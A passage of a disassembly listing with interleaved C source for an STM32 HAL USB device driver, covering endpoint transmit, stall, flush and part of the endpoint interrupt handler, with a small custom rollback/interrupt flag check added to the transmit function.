 800245a:	683a      	ldr	r2, [r7, #0]
 800245c:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 800245e:	697b      	ldr	r3, [r7, #20]
 8002460:	2200      	movs	r2, #0
 8002462:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 8002464:	697b      	ldr	r3, [r7, #20]
 8002466:	2200      	movs	r2, #0
 8002468:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 800246a:	7afb      	ldrb	r3, [r7, #11]
 800246c:	f003 0307 	and.w	r3, r3, #7
 8002470:	b2da      	uxtb	r2, r3
 8002472:	697b      	ldr	r3, [r7, #20]
 8002474:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002476:	68fb      	ldr	r3, [r7, #12]
 8002478:	681b      	ldr	r3, [r3, #0]
 800247a:	6979      	ldr	r1, [r7, #20]
 800247c:	4618      	mov	r0, r3
 800247e:	f004 fbc0 	bl	8006c02 <USB_EPStartXfer>

  return HAL_OK;
 8002482:	2300      	movs	r3, #0
}
 8002484:	4618      	mov	r0, r3
 8002486:	3718      	adds	r7, #24
 8002488:	46bd      	mov	sp, r7
 800248a:	bd80      	pop	{r7, pc}

0800248c <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 800248c:	b480      	push	{r7}
 800248e:	b083      	sub	sp, #12
 8002490:	af00      	add	r7, sp, #0
 8002492:	6078      	str	r0, [r7, #4]
 8002494:	460b      	mov	r3, r1
 8002496:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002498:	78fb      	ldrb	r3, [r7, #3]
 800249a:	f003 0207 	and.w	r2, r3, #7
 800249e:	6879      	ldr	r1, [r7, #4]
 80024a0:	4613      	mov	r3, r2
 80024a2:	009b      	lsls	r3, r3, #2
 80024a4:	4413      	add	r3, r2
 80024a6:	00db      	lsls	r3, r3, #3
 80024a8:	440b      	add	r3, r1
 80024aa:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 80024ae:	681b      	ldr	r3, [r3, #0]
}
 80024b0:	4618      	mov	r0, r3
 80024b2:	370c      	adds	r7, #12
 80024b4:	46bd      	mov	sp, r7
 80024b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80024ba:	4770      	bx	lr

080024bc <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80024bc:	b580      	push	{r7, lr}
 80024be:	b086      	sub	sp, #24
 80024c0:	af00      	add	r7, sp, #0
 80024c2:	60f8      	str	r0, [r7, #12]
 80024c4:	607a      	str	r2, [r7, #4]
 80024c6:	603b      	str	r3, [r7, #0]
 80024c8:	460b      	mov	r3, r1
 80024ca:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80024cc:	7afb      	ldrb	r3, [r7, #11]
 80024ce:	f003 0307 	and.w	r3, r3, #7
 80024d2:	1c5a      	adds	r2, r3, #1
 80024d4:	4613      	mov	r3, r2
 80024d6:	009b      	lsls	r3, r3, #2
 80024d8:	4413      	add	r3, r2
 80024da:	00db      	lsls	r3, r3, #3
 80024dc:	68fa      	ldr	r2, [r7, #12]
 80024de:	4413      	add	r3, r2
 80024e0:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80024e2:	697b      	ldr	r3, [r7, #20]
 80024e4:	687a      	ldr	r2, [r7, #4]
 80024e6:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80024e8:	697b      	ldr	r3, [r7, #20]
 80024ea:	683a      	ldr	r2, [r7, #0]
 80024ec:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 80024ee:	697b      	ldr	r3, [r7, #20]
 80024f0:	2201      	movs	r2, #1
 80024f2:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 80024f6:	697b      	ldr	r3, [r7, #20]
 80024f8:	683a      	ldr	r2, [r7, #0]
 80024fa:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 80024fc:	697b      	ldr	r3, [r7, #20]
 80024fe:	2200      	movs	r2, #0
 8002500:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 8002502:	697b      	ldr	r3, [r7, #20]
 8002504:	2201      	movs	r2, #1
 8002506:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002508:	7afb      	ldrb	r3, [r7, #11]
 800250a:	f003 0307 	and.w	r3, r3, #7
 800250e:	b2da      	uxtb	r2, r3
 8002510:	697b      	ldr	r3, [r7, #20]
 8002512:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002514:	4b0e      	ldr	r3, [pc, #56]	; (8002550 <HAL_PCD_EP_Transmit+0x94>)
 8002516:	781b      	ldrb	r3, [r3, #0]
 8002518:	f003 0302 	and.w	r3, r3, #2
 800251c:	2b00      	cmp	r3, #0
 800251e:	d102      	bne.n	8002526 <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002520:	4b0c      	ldr	r3, [pc, #48]	; (8002554 <HAL_PCD_EP_Transmit+0x98>)
 8002522:	2201      	movs	r2, #1
 8002524:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002526:	68fb      	ldr	r3, [r7, #12]
 8002528:	681b      	ldr	r3, [r3, #0]
 800252a:	6979      	ldr	r1, [r7, #20]
 800252c:	4618      	mov	r0, r3
 800252e:	f004 fb68 	bl	8006c02 <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 8002532:	4b07      	ldr	r3, [pc, #28]	; (8002550 <HAL_PCD_EP_Transmit+0x94>)
 8002534:	781b      	ldrb	r3, [r3, #0]
 8002536:	f003 0302 	and.w	r3, r3, #2
 800253a:	2b00      	cmp	r3, #0
 800253c:	d102      	bne.n	8002544 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 800253e:	4b06      	ldr	r3, [pc, #24]	; (8002558 <HAL_PCD_EP_Transmit+0x9c>)
 8002540:	2201      	movs	r2, #1
 8002542:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 8002544:	2300      	movs	r3, #0
}
 8002546:	4618      	mov	r0, r3
 8002548:	3718      	adds	r7, #24
 800254a:	46bd      	mov	sp, r7
 800254c:	bd80      	pop	{r7, pc}
 800254e:	bf00      	nop
 8002550:	2000026c 	.word	0x2000026c
 8002554:	20000270 	.word	0x20000270
 8002558:	2000027c 	.word	0x2000027c

0800255c <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800255c:	b580      	push	{r7, lr}
 800255e:	b084      	sub	sp, #16
 8002560:	af00      	add	r7, sp, #0
 8002562:	6078      	str	r0, [r7, #4]
 8002564:	460b      	mov	r3, r1
 8002566:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002568:	78fb      	ldrb	r3, [r7, #3]
 800256a:	f003 0207 	and.w	r2, r3, #7
 800256e:	687b      	ldr	r3, [r7, #4]
 8002570:	685b      	ldr	r3, [r3, #4]
 8002572:	429a      	cmp	r2, r3
 8002574:	d901      	bls.n	800257a <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 8002576:	2301      	movs	r3, #1
 8002578:	e04c      	b.n	8002614 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 800257a:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800257e:	2b00      	cmp	r3, #0
 8002580:	da0e      	bge.n	80025a0 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002582:	78fb      	ldrb	r3, [r7, #3]
 8002584:	f003 0307 	and.w	r3, r3, #7
 8002588:	1c5a      	adds	r2, r3, #1
 800258a:	4613      	mov	r3, r2
 800258c:	009b      	lsls	r3, r3, #2
 800258e:	4413      	add	r3, r2
 8002590:	00db      	lsls	r3, r3, #3
 8002592:	687a      	ldr	r2, [r7, #4]
 8002594:	4413      	add	r3, r2
 8002596:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002598:	68fb      	ldr	r3, [r7, #12]
 800259a:	2201      	movs	r2, #1
 800259c:	705a      	strb	r2, [r3, #1]
 800259e:	e00c      	b.n	80025ba <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80025a0:	78fa      	ldrb	r2, [r7, #3]
 80025a2:	4613      	mov	r3, r2
 80025a4:	009b      	lsls	r3, r3, #2
 80025a6:	4413      	add	r3, r2
 80025a8:	00db      	lsls	r3, r3, #3
 80025aa:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80025ae:	687a      	ldr	r2, [r7, #4]
 80025b0:	4413      	add	r3, r2
 80025b2:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80025b4:	68fb      	ldr	r3, [r7, #12]
 80025b6:	2200      	movs	r2, #0
 80025b8:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80025ba:	68fb      	ldr	r3, [r7, #12]
 80025bc:	2201      	movs	r2, #1
 80025be:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80025c0:	78fb      	ldrb	r3, [r7, #3]
 80025c2:	f003 0307 	and.w	r3, r3, #7
 80025c6:	b2da      	uxtb	r2, r3
 80025c8:	68fb      	ldr	r3, [r7, #12]
 80025ca:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80025cc:	687b      	ldr	r3, [r7, #4]
 80025ce:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80025d2:	2b01      	cmp	r3, #1
 80025d4:	d101      	bne.n	80025da <HAL_PCD_EP_SetStall+0x7e>
 80025d6:	2302      	movs	r3, #2
 80025d8:	e01c      	b.n	8002614 <HAL_PCD_EP_SetStall+0xb8>
 80025da:	687b      	ldr	r3, [r7, #4]
 80025dc:	2201      	movs	r2, #1
 80025de:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 80025e2:	687b      	ldr	r3, [r7, #4]
 80025e4:	681b      	ldr	r3, [r3, #0]
 80025e6:	68f9      	ldr	r1, [r7, #12]
 80025e8:	4618      	mov	r0, r3
 80025ea:	f005 febb 	bl	8008364 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 80025ee:	78fb      	ldrb	r3, [r7, #3]
 80025f0:	f003 0307 	and.w	r3, r3, #7
 80025f4:	2b00      	cmp	r3, #0
 80025f6:	d108      	bne.n	800260a <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 80025f8:	687b      	ldr	r3, [r7, #4]
 80025fa:	681a      	ldr	r2, [r3, #0]
 80025fc:	687b      	ldr	r3, [r7, #4]
 80025fe:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 8002602:	4619      	mov	r1, r3
 8002604:	4610      	mov	r0, r2
 8002606:	f005 fffc 	bl	8008602 <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 800260a:	687b      	ldr	r3, [r7, #4]
 800260c:	2200      	movs	r2, #0
 800260e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002612:	2300      	movs	r3, #0
}
 8002614:	4618      	mov	r0, r3
 8002616:	3710      	adds	r7, #16
 8002618:	46bd      	mov	sp, r7
 800261a:	bd80      	pop	{r7, pc}

0800261c <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800261c:	b580      	push	{r7, lr}
 800261e:	b084      	sub	sp, #16
 8002620:	af00      	add	r7, sp, #0
 8002622:	6078      	str	r0, [r7, #4]
 8002624:	460b      	mov	r3, r1
 8002626:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002628:	78fb      	ldrb	r3, [r7, #3]
 800262a:	f003 020f 	and.w	r2, r3, #15
 800262e:	687b      	ldr	r3, [r7, #4]
 8002630:	685b      	ldr	r3, [r3, #4]
 8002632:	429a      	cmp	r2, r3
 8002634:	d901      	bls.n	800263a <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 8002636:	2301      	movs	r3, #1
 8002638:	e040      	b.n	80026bc <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 800263a:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800263e:	2b00      	cmp	r3, #0
 8002640:	da0e      	bge.n	8002660 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002642:	78fb      	ldrb	r3, [r7, #3]
 8002644:	f003 0307 	and.w	r3, r3, #7
 8002648:	1c5a      	adds	r2, r3, #1
 800264a:	4613      	mov	r3, r2
 800264c:	009b      	lsls	r3, r3, #2
 800264e:	4413      	add	r3, r2
 8002650:	00db      	lsls	r3, r3, #3
 8002652:	687a      	ldr	r2, [r7, #4]
 8002654:	4413      	add	r3, r2
 8002656:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002658:	68fb      	ldr	r3, [r7, #12]
 800265a:	2201      	movs	r2, #1
 800265c:	705a      	strb	r2, [r3, #1]
 800265e:	e00e      	b.n	800267e <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002660:	78fb      	ldrb	r3, [r7, #3]
 8002662:	f003 0207 	and.w	r2, r3, #7
 8002666:	4613      	mov	r3, r2
 8002668:	009b      	lsls	r3, r3, #2
 800266a:	4413      	add	r3, r2
 800266c:	00db      	lsls	r3, r3, #3
 800266e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002672:	687a      	ldr	r2, [r7, #4]
 8002674:	4413      	add	r3, r2
 8002676:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002678:	68fb      	ldr	r3, [r7, #12]
 800267a:	2200      	movs	r2, #0
 800267c:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 800267e:	68fb      	ldr	r3, [r7, #12]
 8002680:	2200      	movs	r2, #0
 8002682:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002684:	78fb      	ldrb	r3, [r7, #3]
 8002686:	f003 0307 	and.w	r3, r3, #7
 800268a:	b2da      	uxtb	r2, r3
 800268c:	68fb      	ldr	r3, [r7, #12]
 800268e:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002690:	687b      	ldr	r3, [r7, #4]
 8002692:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002696:	2b01      	cmp	r3, #1
 8002698:	d101      	bne.n	800269e <HAL_PCD_EP_ClrStall+0x82>
 800269a:	2302      	movs	r3, #2
 800269c:	e00e      	b.n	80026bc <HAL_PCD_EP_ClrStall+0xa0>
 800269e:	687b      	ldr	r3, [r7, #4]
 80026a0:	2201      	movs	r2, #1
 80026a2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 80026a6:	687b      	ldr	r3, [r7, #4]
 80026a8:	681b      	ldr	r3, [r3, #0]
 80026aa:	68f9      	ldr	r1, [r7, #12]
 80026ac:	4618      	mov	r0, r3
 80026ae:	f005 feaa 	bl	8008406 <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 80026b2:	687b      	ldr	r3, [r7, #4]
 80026b4:	2200      	movs	r2, #0
 80026b6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80026ba:	2300      	movs	r3, #0
}
 80026bc:	4618      	mov	r0, r3
 80026be:	3710      	adds	r7, #16
 80026c0:	46bd      	mov	sp, r7
 80026c2:	bd80      	pop	{r7, pc}

080026c4 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80026c4:	b580      	push	{r7, lr}
 80026c6:	b082      	sub	sp, #8
 80026c8:	af00      	add	r7, sp, #0
 80026ca:	6078      	str	r0, [r7, #4]
 80026cc:	460b      	mov	r3, r1
 80026ce:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80026d0:	687b      	ldr	r3, [r7, #4]
 80026d2:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80026d6:	2b01      	cmp	r3, #1
 80026d8:	d101      	bne.n	80026de <HAL_PCD_EP_Flush+0x1a>
 80026da:	2302      	movs	r3, #2
 80026dc:	e01b      	b.n	8002716 <HAL_PCD_EP_Flush+0x52>
 80026de:	687b      	ldr	r3, [r7, #4]
 80026e0:	2201      	movs	r2, #1
 80026e2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 80026e6:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80026ea:	2b00      	cmp	r3, #0
 80026ec:	da09      	bge.n	8002702 <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 80026ee:	687b      	ldr	r3, [r7, #4]
 80026f0:	681a      	ldr	r2, [r3, #0]
 80026f2:	78fb      	ldrb	r3, [r7, #3]
 80026f4:	f003 0307 	and.w	r3, r3, #7
 80026f8:	4619      	mov	r1, r3
 80026fa:	4610      	mov	r0, r2
 80026fc:	f003 fcb8 	bl	8006070 <USB_FlushTxFifo>
 8002700:	e004      	b.n	800270c <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 8002702:	687b      	ldr	r3, [r7, #4]
 8002704:	681b      	ldr	r3, [r3, #0]
 8002706:	4618      	mov	r0, r3
 8002708:	f003 fcbe 	bl	8006088 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 800270c:	687b      	ldr	r3, [r7, #4]
 800270e:	2200      	movs	r2, #0
 8002710:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002714:	2300      	movs	r3, #0
}
 8002716:	4618      	mov	r0, r3
 8002718:	3708      	adds	r7, #8
 800271a:	46bd      	mov	sp, r7
 800271c:	bd80      	pop	{r7, pc}

0800271e <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 800271e:	b580      	push	{r7, lr}
 8002720:	b096      	sub	sp, #88	; 0x58
 8002722:	af00      	add	r7, sp, #0
 8002724:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002726:	e3b1      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002728:	687b      	ldr	r3, [r7, #4]
 800272a:	681b      	ldr	r3, [r3, #0]
 800272c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002730:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 8002734:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002738:	b2db      	uxtb	r3, r3
 800273a:	f003 030f 	and.w	r3, r3, #15
 800273e:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 8002742:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002746:	2b00      	cmp	r3, #0
 8002748:	f040 8173 	bne.w	8002a32 <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 800274c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002750:	f003 0310 	and.w	r3, r3, #16
 8002754:	2b00      	cmp	r3, #0
 8002756:	d150      	bne.n	80027fa <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002758:	687b      	ldr	r3, [r7, #4]
 800275a:	681b      	ldr	r3, [r3, #0]
 800275c:	881b      	ldrh	r3, [r3, #0]
 800275e:	b29b      	uxth	r3, r3
 8002760:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002764:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002768:	81fb      	strh	r3, [r7, #14]
 800276a:	687b      	ldr	r3, [r7, #4]
 800276c:	681a      	ldr	r2, [r3, #0]
 800276e:	89fb      	ldrh	r3, [r7, #14]
 8002770:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002774:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002778:	b29b      	uxth	r3, r3
 800277a:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 800277c:	687b      	ldr	r3, [r7, #4]
 800277e:	3328      	adds	r3, #40	; 0x28
 8002780:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002782:	687b      	ldr	r3, [r7, #4]
 8002784:	681b      	ldr	r3, [r3, #0]
 8002786:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800278a:	b29b      	uxth	r3, r3
 800278c:	461a      	mov	r2, r3
 800278e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002790:	781b      	ldrb	r3, [r3, #0]
 8002792:	00db      	lsls	r3, r3, #3
 8002794:	4413      	add	r3, r2
 8002796:	687a      	ldr	r2, [r7, #4]
 8002798:	6812      	ldr	r2, [r2, #0]
 800279a:	4413      	add	r3, r2
 800279c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80027a0:	881b      	ldrh	r3, [r3, #0]
 80027a2:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80027a6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027a8:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 80027aa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ac:	695a      	ldr	r2, [r3, #20]
 80027ae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027b0:	69db      	ldr	r3, [r3, #28]
 80027b2:	441a      	add	r2, r3
 80027b4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027b6:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80027b8:	2100      	movs	r1, #0
 80027ba:	6878      	ldr	r0, [r7, #4]
 80027bc:	f00a f98f 	bl	800cade <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80027c0:	687b      	ldr	r3, [r7, #4]
 80027c2:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80027c6:	b2db      	uxtb	r3, r3
 80027c8:	2b00      	cmp	r3, #0
 80027ca:	f000 835f 	beq.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
 80027ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027d0:	699b      	ldr	r3, [r3, #24]
 80027d2:	2b00      	cmp	r3, #0
 80027d4:	f040 835a 	bne.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 80027d8:	687b      	ldr	r3, [r7, #4]
 80027da:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80027de:	b2db      	uxtb	r3, r3
 80027e0:	f063 037f 	orn	r3, r3, #127	; 0x7f
 80027e4:	b2da      	uxtb	r2, r3
 80027e6:	687b      	ldr	r3, [r7, #4]
 80027e8:	681b      	ldr	r3, [r3, #0]
 80027ea:	b292      	uxth	r2, r2
 80027ec:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 80027f0:	687b      	ldr	r3, [r7, #4]
 80027f2:	2200      	movs	r2, #0
 80027f4:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80027f8:	e348      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 80027fa:	687b      	ldr	r3, [r7, #4]
 80027fc:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002800:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002802:	687b      	ldr	r3, [r7, #4]
 8002804:	681b      	ldr	r3, [r3, #0]
 8002806:	881b      	ldrh	r3, [r3, #0]
 8002808:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 800280c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002810:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002814:	2b00      	cmp	r3, #0
 8002816:	d032      	beq.n	800287e <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002818:	687b      	ldr	r3, [r7, #4]
 800281a:	681b      	ldr	r3, [r3, #0]
 800281c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002820:	b29b      	uxth	r3, r3
 8002822:	461a      	mov	r2, r3
 8002824:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002826:	781b      	ldrb	r3, [r3, #0]
 8002828:	00db      	lsls	r3, r3, #3
 800282a:	4413      	add	r3, r2
 800282c:	687a      	ldr	r2, [r7, #4]
 800282e:	6812      	ldr	r2, [r2, #0]
 8002830:	4413      	add	r3, r2
 8002832:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002836:	881b      	ldrh	r3, [r3, #0]
 8002838:	f3c3 0209 	ubfx	r2, r3, #0, #10
 800283c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800283e:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002840:	687b      	ldr	r3, [r7, #4]
 8002842:	6818      	ldr	r0, [r3, #0]
 8002844:	687b      	ldr	r3, [r7, #4]
 8002846:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 800284a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800284c:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 800284e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002850:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002852:	b29b      	uxth	r3, r3
 8002854:	f005 ff23 	bl	800869e <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002858:	687b      	ldr	r3, [r7, #4]
 800285a:	681b      	ldr	r3, [r3, #0]
 800285c:	881b      	ldrh	r3, [r3, #0]
 800285e:	b29a      	uxth	r2, r3
 8002860:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002864:	4013      	ands	r3, r2
 8002866:	823b      	strh	r3, [r7, #16]
 8002868:	687b      	ldr	r3, [r7, #4]
 800286a:	681b      	ldr	r3, [r3, #0]
 800286c:	8a3a      	ldrh	r2, [r7, #16]
 800286e:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002872:	b292      	uxth	r2, r2
 8002874:	801a      	strh	r2, [r3, #0]

